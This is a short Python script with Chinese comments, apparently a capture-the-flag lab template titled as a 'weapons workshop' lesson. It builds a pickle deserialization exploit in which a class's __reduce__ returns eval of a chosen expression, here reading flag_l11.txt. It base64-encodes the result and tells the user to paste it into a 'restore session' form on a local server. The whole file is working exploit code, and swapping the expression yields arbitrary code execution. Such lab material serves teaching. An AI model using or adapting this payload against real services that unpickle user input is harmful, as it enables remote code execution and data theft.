# L11 武器工坊：pickle 造弹模板
# 用法：填好 TODO -> 命令行跑  python build_pickle.py
# 原理：pickle 的 __reduce__ 告诉 pickle "这个对象怎么重建"——
#       返回 (函数, 参数)，loads 时直接 函数(*参数) —— 引信自带

import base64
import pickle

# TODO：填一个 Python 表达式（字符串）。
# 想一想：repr 回显的是"反序列化出来的对象"，也就是你 __reduce__ 里那个函数的返回值。
# 旗在服务器的 flag_l11.txt。
expr = 'open("flag_l11.txt").read()'

if 'TODO' in expr:
    print('TODO 还没填。提示：Python 读文件的内置姿势 open(路径).read()')
    raise SystemExit(1)


class Shell:
    def __reduce__(self):
        return (eval, (expr,))


payload = base64.b64encode(pickle.dumps(Shell())).decode()
print('=== 弹药（base64）===')
print(payload)
print()
print('=== 发射 ===')
print('浏览器：打开 http://127.0.0.1:8096/ 贴进"恢复会话"提交框')
